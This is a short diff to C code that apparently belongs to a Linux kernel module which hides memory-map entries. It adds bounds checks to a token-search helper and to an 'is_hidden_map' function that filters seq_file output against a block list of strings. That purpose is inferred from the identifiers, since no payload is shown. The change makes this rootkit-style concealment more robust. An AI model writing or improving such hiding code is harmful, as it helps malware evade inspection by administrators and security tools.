@@ -14,9 +14,13 @@ static void *get_task_comm_fn = 0;
 
 static int contains_token(const char *buf, size_t len, const char *token)
 {
-    size_t token_len = strlen(token);
+    size_t token_len;
 
-    if (!buf || !token || token_len == 0 || len < token_len)
+    if (!buf || !token)
+        return 0;
+
+    token_len = strlen(token);
+    if (token_len == 0 || len < token_len)
         return 0;
 
     for (size_t i = 0; i + token_len <= len; ++i) {
@@ -41,10 +45,18 @@ static int __attribute__((optimize("O0"))) is_hidden_map(struct seq_file *m, siz
     if (!m || !m->buf || m->count < prev_count)
         return 0;
 
+    /* bounds check against seq_file buffer size */
+    if (prev_count > m->size)
+        return 0;
+
     start = m->buf + prev_count;
     new_len = m->count - prev_count;
     if (new_len == 0)
         return 0;
+
+    /* clamp to m->size in case m->count was incremented beyond buffer */
+    if (prev_count + new_len > m->size)
+        new_len = m->size - prev_count;
 
     for (int i = 0; i < (int)(sizeof(block_str) / sizeof(block_str[0])); i++) {
         if (contains_token(start, new_len, block_str[i]))
